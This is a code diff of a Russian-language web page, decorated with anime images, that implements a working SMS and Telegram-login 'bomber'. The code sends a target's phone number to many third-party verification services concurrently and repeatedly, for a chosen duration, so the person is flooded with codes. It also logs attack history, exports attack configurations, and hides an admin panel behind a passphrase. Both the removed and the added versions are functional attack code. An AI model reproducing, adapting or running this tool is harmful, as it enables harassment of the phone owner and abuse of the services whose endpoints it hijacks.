-document.getElementById('nekoCorner').addEventListener('click', fetchNeko);
-fetchNeko();
-setInterval(fetchNeko, 30000);
-
-// ========== АУДИО FALLBACK ==========
-document.getElementById('audioPlayer').addEventListener('error', () => {
-  document.getElementById('audioFallback').style.display = 'block';
-});
-
-// ========== ЛОГИКА АТАКИ ==========
-let attackRunning = false;
-let attackAbortController = null;
-let stats = { total: 0, success: 0, failed: 0 };
-let startTime = null;
-let duration = 60;
-let concurrency = 10;
-
-function formatPhone(phone, type) {
-  const clean = phone.replace(/\D/g, '');
-  switch(type) {
-    case 'wp': return '+' + clean;
-    case 'nc': return clean.slice(1);
-    case 'cp': return clean.slice(1, 4);
-    case 'ru': return '+' + clean;
-    case 'sp': return '+' + clean;
-    case 'pm': return clean.slice(1, 4) + '-' + clean.slice(4, 7) + '-' + clean.slice(7, 9) + '-' + clean.slice(9, 11);
-    case 'bf': return clean.replace(/^7/, '8');
-    default: return clean;
-  }
-}
-
-function applyPlaceholders(template, phone) {
-  return template.replace(/\{(\w+)\}/g, (_, key) => {
-    if (key === 'rand_name') return 'Иван';
-    if (key === 'rand_surname') return 'Петров';
-    if (key === 'rand_email') return 'user@mail.ru';
-    if (key === 'rand_hex32') return 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx';
-    if (key === 'rand_days') return '5';
-    if (key === 'rand_int100_999') return '500';
-    if (key === 'rand_hex26') return 'abcdefabcdefabcdefabcdef';
-    return formatPhone(phone, key);
-  });
-}
-
-async function sendServiceRequest(service, phone, signal) {
-  let url = service.url;
-  const method = service.method || 'POST';
-  const headers = {};
-  let body = null;
-  if (service.params && Object.keys(service.params).length > 0) {
-    const urlObj = new URL(url);
-    Object.entries(service.params).forEach(([k, v]) => urlObj.searchParams.set(k, applyPlaceholders(String(v), phone)));
-    url = urlObj.toString();
-  } else {
-    url = applyPlaceholders(url, phone);
-  }
-  if (service.headers) {
-    Object.entries(service.headers).forEach(([k, v]) => headers[k] = applyPlaceholders(String(v), phone));
-  }
-  if (service.type === 'json') {
-    body = JSON.stringify(service.body);
-    headers['Content-Type'] = 'application/json';
-    body = applyPlaceholders(body, phone);
-  } else if (service.type === 'form' && service.body) {
-    const params = new URLSearchParams();
-    Object.entries(service.body).forEach(([k, v]) => params.append(k, applyPlaceholders(String(v), phone)));
-    body = params.toString();
-    headers['Content-Type'] = 'application/x-www-form-urlencoded';
-  }
-  try {
-    await fetch(url, { method, headers, body, mode: 'no-cors', signal });
-    return true;
-  } catch (err) {
-    if (err.name === 'AbortError') throw err;
-    return false;
-  }
-}
-
-async function sendTgOAuthRequest(svc, phone, signal) {
-  if (svc.bot_id) {
-    const url = 'https://oauth.telegram.org/auth/request';
-    const body = new URLSearchParams({
-      phone, bot_id: svc.bot_id, origin: svc.origin,
-      embed: svc.embed || '1', request_access: svc.request_access || 'write',
-      return_to: svc.return_to || 'https://fragment.com/'
-    });
-    try {
-      await fetch(url, { method:'POST', headers:{ 'Content-Type':'application/x-www-form-urlencoded', 'X-Requested-With':'XMLHttpRequest' }, body, mode:'no-cors', signal });
-      return true;
-    } catch(e) {
-      if (e.name === 'AbortError') throw e;
-      return false;
-    }
-  }
-  if (svc.url) return sendServiceRequest(svc, phone, signal);
-  return false;
-}
-
-async function executeTasks(tasks, phone, signal, limit) {
-  const executing = [];
-  const total = tasks.length;
-  let idx = 0;
-  const results = [];
-  const enqueue = async () => {
-    while (idx < total) {
-      const i = idx++;
-      const p = tasks[i]().then(ok => {
-        executing.splice(executing.indexOf(p), 1);
-        stats.total++;
-        ok ? stats.success++ : stats.failed++;
-        updateStatsDisplay();
-      });
-      executing.push(p);
-      results.push(p);
-      if (executing.length >= limit) await Promise.race(executing);
-    }
-  };
-  await enqueue();
-  await Promise.all(executing);
-}
-
-function logUpdate(msg, color) {
-  const log = document.getElementById('attackLog');
-  const div = document.createElement('div');
-  div.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
-  div.style.color = color || 'var(--muted)';
-  log.appendChild(div);
-  log.scrollTop = log.scrollHeight;
-}
-
-function updateStatsDisplay() {
-  document.getElementById('totalCount').textContent = stats.total;
-  document.getElementById('successCount').textContent = stats.success;
-  document.getElementById('failCount').textContent = stats.failed;
-}
-
-async function startAttack() {
-  if (attackRunning) return;
-  const phone = document.getElementById('attackPhone').value.trim();
-  if (!phone) return alert('Введите номер');
-
-  if (phone === 'hacklam787') {
-    document.getElementById('adminPanel').classList.toggle('active');
-    updateAdminPanel();
-    return;
-  }
-
-  duration = parseInt(document.getElementById('attackDuration').value) || 60;
-  concurrency = parseInt(document.getElementById('concurrency').value) || 10;
-  const region = document.querySelector('#regionChips .region-chip.active')?.dataset.r || 'ru';
-  const smsEnabled = document.getElementById('enableSms').checked;
-  const tgEnabled = document.getElementById('enableTg').checked;
-
-  const tasks = [];
-  if (smsEnabled) {
-    const services = smsServices[region] || [];
-    services.forEach(svc => tasks.push(() => sendServiceRequest(svc, phone, attackAbortController.signal)));
-  }
-  if (tgEnabled) {
-    tgOAuthServices.forEach(svc => tasks.push(() => sendTgOAuthRequest(svc, phone, attackAbortController.signal)));
-  }
-  if (tasks.length === 0) return alert('Нет активных сервисов');
-
-  attackRunning = true;
-  attackAbortController = new AbortController();
-  stats = { total: 0, success: 0, failed: 0 };
-  startTime = Date.now();
-  updateStatsDisplay();
-  logUpdate(`Старт атаки (${tasks.length} сервисов, concurrency=${concurrency})`);
-  document.getElementById('attackStartBtn').style.display = 'none';
-  document.getElementById('attackStopBtn').style.display = 'inline-block';
-
-  try {
-    while (attackRunning && (Date.now() - startTime) < duration * 1000) {
-      await executeTasks(tasks, phone, attackAbortController.signal, concurrency);
-      await new Promise(r => setTimeout(r, 100));
-    }
-    logUpdate('Атака завершена по времени', '#5ee8a0');
-  } catch(e) {
-    logUpdate('Атака остановлена', '#ff6b6b');
-  }
-  stopAttack(true);
-}
-
-function stopAttack(silent = false) {
-  if (!attackRunning) return;
-  attackRunning = false;
-  attackAbortController.abort();
-  document.getElementById('attackStartBtn').style.display = '';
-  document.getElementById('attackStopBtn').style.display = 'none';
-  if (!silent) logUpdate('Остановлено пользователем');
-  const phone = document.getElementById('attackPhone').value.trim();
-  if (phone && phone !== 'hacklam787' && stats.total > 0) {
-    const record = {
-      date: new Date().toLocaleString('ru'), phone, type: 'unified',
-      total: stats.total, success: stats.success, failed: stats.failed
-    };
-    let hist = JSON.parse(localStorage.getItem('attack_hist') || '[]');
-    hist.unshift(record);
-    if (hist.length > 30) hist = hist.slice(0, 30);
-    localStorage.setItem('attack_hist', JSON.stringify(hist));
-    renderHistory();
-  }
-}
-
-document.getElementById('attackStartBtn').addEventListener('click', startAttack);
-document.getElementById('attackStopBtn').addEventListener('click', () => stopAttack());
-
-// UI для TG сервисов
-document.getElementById('enableTg').addEventListener('change', function() {
-  document.getElementById('tgServiceList').style.display = this.checked ? 'flex' : 'none';
-});
-
-function populateTgList() {
-  const list = document.getElementById('tgServiceList');
-  list.innerHTML = tgOAuthServices.map(svc => `
-    <label style="display:flex; align-items:center; gap:.3rem; font-size:.75rem; color:var(--muted); background:rgba(199,125,255,.06); padding:.3rem .6rem; border-radius:12px;">
-      <input type="checkbox" checked> ${svc.name}
-    </label>
-  `).join('');
-}
-
-// Экспорт/импорт
-document.getElementById('exportBtn').addEventListener('click', () => {
-  const config = {
-    phone: document.getElementById('attackPhone').value,
-    duration: document.getElementById('attackDuration').value,
-    concurrency: document.getElementById('concurrency').value,
-    region: document.querySelector('#regionChips .region-chip.active')?.dataset.r,
-    sms: document.getElementById('enableSms').checked,
-    tg: document.getElementById('enableTg').checked
-  };
-  const blob = new Blob([JSON.stringify(config)], {type:'application/json'});
-  const a = document.createElement('a');
-  a.href = URL.createObjectURL(blob);
-  a.download = 'attack_config.json';
-  a.click();
-  URL.revokeObjectURL(a.href);
-});
-
-document.getElementById('importBtn').addEventListener('click', () => {
-  const input = document.createElement('input');
-  input.type = 'file';
-  input.accept = '.json';
-  input.onchange = e => {
-    const file = e.target.files[0];
-    if (!file) return;
-    const reader = new FileReader();
-    reader.onload = () => {
-      try {
-        const cfg = JSON.parse(reader.result);
-        if (cfg.phone) document.getElementById('attackPhone').value = cfg.phone;
-        if (cfg.duration) document.getElementById('attackDuration').value = cfg.duration;
-        if (cfg.concurrency) document.getElementById('concurrency').value = cfg.concurrency;
-        if (cfg.region) {
-          document.querySelectorAll('#regionChips .region-chip').forEach(c => c.classList.remove('active'));
-          const target = document.querySelector(`#regionChips .region-chip[data-r="${cfg.region}"]`);
-          if (target) target.classList.add('active');
-        }
-        if (cfg.hasOwnProperty('sms')) document.getElementById('enableSms').checked = cfg.sms;
-        if (cfg.hasOwnProperty('tg')) {
-          document.getElementById('enableTg').checked = cfg.tg;
-          document.getElementById('tgServiceList').style.display = cfg.tg ? 'flex' : 'none';
-        }
-      } catch(e) { alert('Ошибка импорта'); }
-    };
-    reader.readAsText(file);
-  };
-  input.click();
-});
-
-document.getElementById('clearHistoryBtn').addEventListener('click', () => {
-  localStorage.removeItem('attack_hist');
+  
+  // ========== ОСТАЛЬНЫЕ МОДУЛИ: АВАТАР, ГАЛЕРЕЯ, ЦИТАТЫ, НЕКО ==========
+  function setImageWithFallback(img, src, fallbackSvg) { img.src=src||''; img.onerror=()=>{ if(fallbackSvg) img.src='data:image/svg+xml,'+encodeURIComponent(fallbackSvg); img.style.opacity='1'; }; img.onload=()=>img.style.opacity='1'; }
+  const AVATAR_FALLBACK=`<svg xmlns="http://www.w3.org/2000/svg" width="155" height="155" viewBox="0 0 155 155"><rect fill="#22133a" width="155" height="155"/><text x="77" y="80" text-anchor="middle" fill="#c77dff" font-size="30">★</text></svg>`;
+  const WAIFU_FALLBACK=`<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200" viewBox="0 0 200 200"><rect fill="#1a1025" width="200" height="200"/><text x="100" y="100" text-anchor="middle" fill="#ffb7c5" font-size="20">🌸</text></svg>`;
+  async function fetchAvatar() { try{ let r=await fetch('https://nekos.life/api/v2/img/neko'); if(r.ok){ let d=await r.json(); setImageWithFallback(document.getElementById('avatarImg'), d.url, AVATAR_FALLBACK); return; } }catch(e){} document.getElementById('avatarImg').src='data:image/svg+xml,'+encodeURIComponent(AVATAR_FALLBACK); document.getElementById('avatarImg').style.opacity='1'; }
+  fetchAvatar();
+  async function loadGalleryImage(img){ let cat=['neko','waifu','meow'][Math.floor(Math.random()*3)]; try{ let r=await fetch(`https://nekos.life/api/v2/img/${cat}`); if(r.ok){ let d=await r.json(); setImageWithFallback(img, d.url, WAIFU_FALLBACK); return; } }catch(e){} img.style.display='none'; }
+  function buildGallery(){ let g=document.getElementById('gallery'); g.innerHTML=''; for(let i=0;i<4;i++){ let img=document.createElement('img'); img.loading='lazy'; img.style.opacity='0.4'; g.appendChild(img); loadGalleryImage(img); } }
+  buildGallery();
+  
+  const quotes=[{q:'Если не веришь в себя, то и не стоит начинать.',c:'Макака',a:'Доктор Стоун'},{q:'Настоящая сила — в умении защищать.',c:'Аска',a:'Евангелион'},{q:'Неважно, сколько у тебя таланта. Главное — желание.',c:'Мидория',a:'Моя геройская академия'},{q:'Даже в самой глубокой тьме можно найти свет.',c:'Тандзиро',a:'Клинок, рассекающий демонов'}];
+  function fetchQuote(){ let f=quotes[Math.floor(Math.random()*quotes.length)]; document.getElementById('quoteText').textContent=`"${f.q}"`; document.getElementById('quoteSrc').textContent=`— ${f.c} · ${f.a}`; }
+  fetchQuote(); document.getElementById('newQuoteBtn').addEventListener('click', fetchQuote);
+  
+  const nekoImg=document.getElementById('nekoImg');
+  async function fetchNeko(){ nekoImg.style.opacity='0.3'; try{ let r=await fetch('https://nekos.life/api/v2/img/neko'); if(r.ok){ let d=await r.json(); setImageWithFallback(nekoImg, d.url, WAIFU_FALLBACK); return; } }catch(e){} nekoImg.style.opacity='0'; }
+  document.getElementById('nekoCorner').addEventListener('click', fetchNeko); fetchNeko(); setInterval(fetchNeko,30000);
+  document.getElementById('audioPlayer').addEventListener('error',()=>{ document.getElementById('audioFallback').style.display='block'; });
+  
+  // Табы
+  document.querySelectorAll('.tab').forEach(tab=>{ tab.addEventListener('click',()=>{ document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active')); tab.classList.add('active'); document.querySelectorAll('.tab-content').forEach(c=>c.classList.remove('active')); document.getElementById('tab-'+tab.dataset.tab).classList.add('active'); if(tab.dataset.tab==='bio') fetchQuote(); if(tab.dataset.tab==='attack') renderHistory(); if(tab.dataset.tab==='ip') runIpCheck(); }); });
+  
+  // ========== ЛОГИКА АТАКИ (без изменений) ==========
+  let attackRunning=false, attackAbortController=null, stats={total:0,success:0,failed:0}, startTime=null;
+  function formatPhone(phone,type){ let clean=phone.replace(/\D/g,''); if(type==='wp') return '+'+clean; if(type==='nc') return clean.slice(1); if(type==='cp') return clean.slice(1,4); return '+'+clean; }
+  function applyPlaceholders(template,phone){ return template.replace(/\{(\w+)\}/g,(_,key)=>{ if(key==='rand_name') return 'Иван'; if(key==='rand_surname') return 'Петров'; if(key==='rand_email') return 'user@mail.ru'; if(key==='rand_hex32') return 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'; if(key==='rand_days') return '5'; if(key==='rand_int100_999') return '500'; if(key==='rand_hex26') return 'abcdefabcdefabcdefabcdef'; return formatPhone(phone,key); }); }
+  async function sendServiceRequest(service,phone,signal){ let url=service.url,m=service.method||'POST',headers={},body=null; if(service.params&&Object.keys(service.params).length){ let u=new URL(url); Object.entries(service.params).forEach(([k,v])=>u.searchParams.set(k,applyPlaceholders(String(v),phone))); url=u.toString(); } else url=applyPlaceholders(url,phone); if(service.headers) Object.entries(service.headers).forEach(([k,v])=>headers[k]=applyPlaceholders(String(v),phone)); if(service.type==='json'){ body=JSON.stringify(service.body); headers['Content-Type']='application/json'; body=applyPlaceholders(body,phone); } else if(service.type==='form'&&service.body){ let p=new URLSearchParams(); Object.entries(service.body).forEach(([k,v])=>p.append(k,applyPlaceholders(String(v),phone))); body=p.toString(); headers['Content-Type']='application/x-www-form-urlencoded'; } try{ await fetch(url,{method:m,headers,body,mode:'no-cors',signal}); return true; } catch(err){ if(err.name==='AbortError') throw err; return false; } }
+  async function sendTgOAuthRequest(svc,phone,signal){ if(svc.bot_id){ let url='https://oauth.telegram.org/auth/request', body=new URLSearchParams({phone,bot_id:svc.bot_id,origin:svc.origin,embed:'1',request_access:svc.request_access||'write',return_to:svc.return_to||'https://fragment.com/'}); try{ await fetch(url,{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded','X-Requested-With':'XMLHttpRequest'},body,mode:'no-cors',signal}); return true; }catch(e){ if(e.name==='AbortError')throw e; return false; } } if(svc.url) return sendServiceRequest(svc,phone,signal); return false; }
+  async function executeTasks(tasks,phone,signal,limit){ let executing=[],idx=0; while(idx<tasks.length){ let i=idx++,p=tasks[i]().then(ok=>{ executing.splice(executing.indexOf(p),1); stats.total++; ok?stats.success++:stats.failed++; updateStatsDisplay(); }); executing.push(p); if(executing.length>=limit) await Promise.race(executing); } await Promise.all(executing); }
+  function updateStatsDisplay(){ document.getElementById('totalCount').textContent=stats.total; document.getElementById('successCount').textContent=stats.success; document.getElementById('failCount').textContent=stats.failed; }
+  function logUpdate(msg,color){ let log=document.getElementById('attackLog'),div=document.createElement('div'); div.textContent=`[${new Date().toLocaleTimeString()}] ${msg}`; div.style.color=color||'var(--muted)'; log.appendChild(div); log.scrollTop=log.scrollHeight; }
+  async function startAttack(){ if(attackRunning)return; let phone=document.getElementById('attackPhone').value.trim(); if(!phone) return alert('Введите номер'); if(phone==='hacklam787'){ document.getElementById('adminPanel').classList.toggle('active'); updateAdminPanel(); return; }
+  let duration=parseInt(document.getElementById('attackDuration').value)||60, concurrency=parseInt(document.getElementById('concurrency').value)||10, region=document.querySelector('#regionChips .region-chip.active')?.dataset.r||'ru', smsEnabled=document.getElementById('enableSms').checked, tgEnabled=document.getElementById('enableTg').checked, tasks=[];
+  if(smsEnabled){ let services=smsServices[region]||[]; services.forEach(svc=>tasks.push(()=>sendServiceRequest(svc,phone,attackAbortController.signal))); }
+  if(tgEnabled) tgOAuthServices.forEach(svc=>tasks.push(()=>sendTgOAuthRequest(svc,phone,attackAbortController.signal)));
+  if(!tasks.length) return alert('Нет активных сервисов');
+  attackRunning=true; attackAbortController=new AbortController(); stats={total:0,success:0,failed:0}; startTime=Date.now(); updateStatsDisplay(); logUpdate(`Старт атаки (${tasks.length} сервисов)`); document.getElementById('attackStartBtn').style.display='none'; document.getElementById('attackStopBtn').style.display='inline-block';
+  try{ while(attackRunning&&(Date.now()-startTime)<duration*1000){ await executeTasks(tasks,phone,attackAbortController.signal,concurrency); await new Promise(r=>setTimeout(r,100)); } logUpdate('Атака завершена по времени','#5ee8a0'); }catch(e){ logUpdate('Атака остановлена','#ff6b6b'); } stopAttack(true); }
+  function stopAttack(silent=false){ if(!attackRunning)return; attackRunning=false; attackAbortController?.abort(); document.getElementById('attackStartBtn').style.display=''; document.getElementById('attackStopBtn').style.display='none'; if(!silent) logUpdate('Остановлено пользователем'); let phone=document.getElementById('attackPhone').value.trim(); if(phone&&phone!=='hacklam787'&&stats.total>0){ let record={date:new Date().toLocaleString(),phone,type:'unified',total:stats.total,success:stats.success,failed:stats.failed}, hist=JSON.parse(localStorage.getItem('attack_hist')||'[]'); hist.unshift(record); if(hist.length>30) hist=hist.slice(0,30); localStorage.setItem('attack_hist',JSON.stringify(hist)); renderHistory(); } }
+  document.getElementById('attackStartBtn').onclick=startAttack; document.getElementById('attackStopBtn').onclick=()=>stopAttack();
+  document.getElementById('enableTg').onchange=function(){ document.getElementById('tgServiceList').style.display=this.checked?'flex':'none'; };
+  function populateTgList(){ let list=document.getElementById('tgServiceList'); list.innerHTML=(tgOAuthServices||[]).map(svc=>`<label style="display:flex; align-items:center; gap:.3rem; background:rgba(199,125,255,.06); padding:.3rem .6rem; border-radius:12px;"><input type="checkbox" checked> ${svc.name}</label>`).join(''); }
+  document.getElementById('exportBtn').onclick=()=>{ let cfg={phone:document.getElementById('attackPhone').value,duration:document.getElementById('attackDuration').value,concurrency:document.getElementById('concurrency').value,region:document.querySelector('#regionChips .region-chip.active')?.dataset.r,sms:document.getElementById('enableSms').checked,tg:document.getElementById('enableTg').checked}; let a=document.createElement('a'); a.href=URL.createObjectURL(new Blob([JSON.stringify(cfg)],{type:'application/json'})); a.download='attack_config.json'; a.click(); URL.revokeObjectURL(a.href); };
+  document.getElementById('importBtn').onclick=()=>{ let inp=document.createElement('input'); inp.type='file'; inp.accept='.json'; inp.onchange=e=>{ let file=e.target.files[0]; if(!file)return; let reader=new FileReader(); reader.onload=()=>{ try{ let cfg=JSON.parse(reader.result); if(cfg.phone) document.getElementById('attackPhone').value=cfg.phone; if(cfg.duration) document.getElementById('attackDuration').value=cfg.duration; if(cfg.concurrency) document.getElementById('concurrency').value=cfg.concurrency; if(cfg.region){ document.querySelectorAll('#regionChips .region-chip').forEach(c=>c.classList.remove('active')); let target=document.querySelector(`#regionChips .region-chip[data-r="${cfg.region}"]`); if(target) target.classList.add('active'); } if(cfg.hasOwnProperty('sms')) document.getElementById('enableSms').checked=cfg.sms; if(cfg.hasOwnProperty('tg')){ document.getElementById('enableTg').checked=cfg.tg; document.getElementById('tgServiceList').style.display=cfg.tg?'flex':'none'; } }catch(e){ alert('Ошибка импорта'); } }; reader.readAsText(file); }; inp.click(); };
+  document.getElementById('clearHistoryBtn').onclick=()=>{ localStorage.removeItem('attack_hist'); renderHistory(); };
+  document.querySelectorAll('#regionChips .region-chip').forEach(chip=>{ chip.onclick=()=>{ document.querySelectorAll('#regionChips .region-chip').forEach(c=>c.classList.remove('active')); chip.classList.add('active'); }; });
+  function renderHistory(){ let hist=JSON.parse(localStorage.getItem('attack_hist')||'[]'); let container=document.getElementById('historyEntries'); if(!hist.length){ container.innerHTML='<div style="color:var(--muted)">Нет завершённых атак</div>'; return; } container.innerHTML=hist.map(h=>`<div class="history-item"><div class="h-top"><span class="h-phone">${h.phone}</span><span class="h-region">${h.type}</span></div><div class="h-stats"><span class="ok">✓${h.success}</span><span class="fail">✗${h.failed}</span><span>${h.total?Math.round(h.success*100/h.total):0}%</span></div><div style="font-size:.7rem;">${h.date}</div></div>`).join(''); }
   renderHistory();
-});
-
-document.querySelectorAll('#regionChips .region-chip').forEach(chip => {
-  chip.addEventListener('click', () => {
-    document.querySelectorAll('#regionChips .region-chip').forEach(c => c.classList.remove('active'));
-    chip.classList.add('active');
-  });
-});
-
-// ========== ИСТОРИЯ ==========
-function renderHistory() {
-  const hist = JSON.parse(localStorage.getItem('attack_hist') || '[]');
-  const container = document.getElementById('historyEntries');
-  if (!hist.length) {
-    container.innerHTML = '<div style="color:var(--muted)">Нет завершённых атак</div>';
-    return;
-  }
-  container.innerHTML = hist.map(h => `
-    <div class="history-item">
-      <div class="h-top"><span class="h-phone">${h.phone}</span><span class="h-region">${h.type}</span></div>
-      <div class="h-stats">
-        <span class="ok">✓${h.success}</span>
-        <span class="fail">✗${h.failed}</span>
-        <span>${h.total ? Math.round(h.success*100/h.total) : 0}%</span>
-      </div>
-      <div style="font-size:.7rem; margin-top:.2rem;">${h.date}</div>
-    </div>
-  `).join('');
-}
-renderHistory();
-
-// ========== АДМИН-ПАНЕЛЬ ==========
-function getCurrentIp() {
-  return fetch('https://api.ipify.org?format=json')
-    .then(r => r.json())
-    .then(d => d.ip)
-    .catch(() => 'неизвестно');
-}
-function getBannedIps() { return JSON.parse(localStorage.getItem('banned_ips') || '[]'); }
-function saveBannedIps(ips) { localStorage.setItem('banned_ips', JSON.stringify(ips)); }
-function updateAdminPanel() {
-  const banList = document.getElementById('banList');
-  const banned = getBannedIps();
-  banList.innerHTML = banned.length ? banned.map(ip => `<span style="display:inline-block; background:rgba(255,107,107,.1); padding:.3rem .6rem; margin:.2rem; border-radius:10px;">${ip} <span style="cursor:pointer; color:#ff6b6b;" data-ip="${ip}">✕</span></span>`).join('') : 'Нет забаненных IP';
-  document.querySelectorAll('#banList span[data-ip]').forEach(btn => {
-    btn.addEventListener('click', (e) => {
-      const ip = e.currentTarget.dataset.ip;
-      saveBannedIps(getBannedIps().filter(i => i !== ip));
-      updateAdminPanel();
-    });
-  });
-  getCurrentIp().then(ip => document.getElementById('adminCurrentIp').textContent = ip);
-}
-document.getElementById('addBanBtn').addEventListener('click', () => {
-  const ip = document.getElementById('banIpInput').value.trim();
-  if (!ip) return;
-  const banned = getBannedIps();
-  if (!banned.includes(ip)) {
-    banned.push(ip);
-    saveBannedIps(banned);
-    updateAdminPanel();
-  }
-});
-document.getElementById('clearBanBtn').addEventListener('click', () => {
-  saveBannedIps([]);
-  updateAdminPanel();
-});
-
-// Блокировка при загрузке
-(async function checkBan() {
-  if (window.location.protocol === 'file:') return;
-  try {
-    const ip = await getCurrentIp();
-    if (getBannedIps().includes(ip)) {
-      document.body.innerHTML = `<div style="display:flex; align-items:center; justify-content:center; height:100vh; font-family:var(--fb); color:var(--text); background:var(--bg);"><div style="text-align:center; padding:2rem; background:var(--card); border-radius:var(--radius); border:1px solid var(--border);"><h1 style="color:var(--accent);">🚫 Доступ запрещён</h1><p>Ваш IP (${ip}) заблокирован администратором.</p></div></div>`;
-    }
-  } catch(e) {}
-})();
-
-// ========== IP CHECK ==========
-async function runIpCheck() {
-  const tbody = document.getElementById('ipTableBody');
-  tbody.innerHTML = '<tr><td>Загрузка...</td><td>⏳</td></tr>';
-  try {
-    const resp = await fetch('https://ipapi.co/json/');
-    if (!resp.ok) throw new Error('API error');
-    const d = await resp.json();
-    const rows = [
-      ['IP-адрес', d.ip],
-      ['Страна', d.country_name],
-      ['Город', d.city],
-      ['Провайдер', d.org],
-      ['ASN', d.asn],
-      ['Прокси', d.proxy ? 'Да' : 'Нет'],
-      ['Хостинг', d.hosting ? 'Да' : 'Нет']
-    ];
-    let webrtcLeak = null;
-    if (window.RTCPeerConnection) {
-      try {
-        webrtcLeak = await new Promise((resolve) => {
-          const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
-          pc.createDataChannel(''); pc.createOffer().then(offer => pc.setLocalDescription(offer));
-          pc.onicecandidate = (e) => {
-            if (e.candidate) {
-              const parts = e.candidate.candidate.split(' ');
-              const ip = parts[4];
-              if (ip && ip !== '0.0.0.0' && !ip.startsWith('192.168') && !ip.startsWith('10.') && !ip.startsWith('172.')) {
-                resolve(ip); pc.close();
-              }
-            } else { resolve(null); pc.close(); }
-          };
-          setTimeout(() => { resolve(null); pc.close(); }, 3000);
-        });
-      } catch(e) {}
-    }
-    rows.push(['WebRTC утечка', webrtcLeak ? `Да (${webrtcLeak})` : 'Нет']);
-    tbody.innerHTML = rows.map(([label, val]) => {
-      let cls = 'ok';
-      if (val === 'Да') cls = 'warn';
-      return `<tr><td>${label}</td><td class="${cls}">${val}</td></tr>`;
-    }).join('');
-  } catch(e) {
-    tbody.innerHTML = '<tr><td colspan="2" class="bad">Ошибка проверки</td></tr>';
-  }
-}
-document.getElementById('refreshIpBtn').addEventListener('click', runIpCheck);
-if (document.getElementById('tab-ip').classList.contains('active')) runIpCheck();
-
-// ========== ЗАПУСК ==========
-loadServices();
+  
+  // IP проверка
+  async function runIpCheck(){ let tbody=document.getElementById('ipTableBody'); tbody.innerHTML='<tr><td>Загрузка...</td><td>⏳</td></tr>'; try{ let r=await fetch('https://ipapi.co/json/'); if(!r.ok)throw new Error(); let d=await r.json(); let rows=[['IP-адрес',d.ip],['Страна',d.country_name],['Город',d.city],['Провайдер',d.org],['ASN',d.asn],['Прокси',d.proxy?'Да':'Нет'],['Хостинг',d.hosting?'Да':'Нет']]; let webrtcLeak=null; if(window.RTCPeerConnection) try{ webrtcLeak=await new Promise(resolve=>{ let pc=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]}); pc.createDataChannel(''); pc.createOffer().then(offer=>pc.setLocalDescription(offer)); pc.onicecandidate=e=>{ if(e.candidate){ let parts=e.candidate.candidate.split(' '),ip=parts[4]; if(ip&&ip!=='0.0.0.0'&&!ip.startsWith('192.168')&&!ip.startsWith('10.')&&!ip.startsWith('172.')){ resolve(ip); pc.close(); } } else{ resolve(null); pc.close(); } }; setTimeout(()=>{ resolve(null); pc.close(); },3000); }); }catch(e){} rows.push(['WebRTC утечка',webrtcLeak?`Да (${webrtcLeak})`:'Нет']); tbody.innerHTML=rows.map(([l,v])=>`<tr><td>${l}</td><td class="${v==='Да'?'warn':''}">${v}</td></tr>`).join(''); }catch(e){ tbody.innerHTML='<tr><td colspan="2" class="bad">Ошибка проверки</td></tr>'; } }
+  document.getElementById('refreshIpBtn').onclick=runIpCheck; if(document.getElementById('tab-ip').classList.contains('active')) runIpCheck();
+  
+  // админ панель
+  async function getCurrentIp(){ try{ let r=await fetch('https://api.ipify.org?format=json'); let d=await r.json(); return d.ip; }catch(e){ return 'неизвестно'; } }
+  function getBannedIps(){ return JSON.parse(localStorage.getItem('banned_ips')||'[]'); }
+  function saveBannedIps(ips){ localStorage.setItem('banned_ips',JSON.stringify(ips)); }
+  function updateAdminPanel(){ let banList=document.getElementById('banList'), banned=getBannedIps(); banList.innerHTML=banned.length?banned.map(ip=>`<span style="display:inline-block; background:rgba(255,107,107,.1); padding:.3rem .6rem; margin:.2rem; border-radius:10px;">${ip} <span style="cursor:pointer; color:#ff6b6b;" data-ip="${ip}">✕</span></span>`).join(''):'Нет забаненных IP'; document.querySelectorAll('#banList span[data-ip]').forEach(btn=>{ btn.addEventListener('click',(e)=>{ let ip=e.currentTarget.dataset.ip; saveBannedIps(getBannedIps().filter(i=>i!==ip)); updateAdminPanel(); }); }); getCurrentIp().then(ip=>document.getElementById('adminCurrentIp').textContent=ip); }
+  document.getElementById('addBanBtn').onclick=()=>{ let ip=document.getElementById('banIpInput').value.trim(); if(!ip)return; let banned=getBannedIps(); if(!banned.includes(ip)){ banned.push(ip); saveBannedIps(banned); updateAdminPanel(); } };
+  document.getElementById('clearBanBtn').onclick=()=>{ saveBannedIps([]); updateAdminPanel(); };
+  (async function checkBan(){ if(window.location.protocol==='file:')return; let ip=await getCurrentIp(); if(getBannedIps().includes(ip)) document.body.innerHTML=`<div style="display:flex; align-items:center; justify-content:center; height:100vh;"><div style="text-align:center; padding:2rem; background:var(--card); border-radius:var(--radius);"><h1 style="color:var(--accent);">🚫 Доступ запрещён</h1><p>Ваш IP (${ip}) заблокирован</p></div></div>`; })();
+  loadServices();
 </script>
 </body>
 </html>
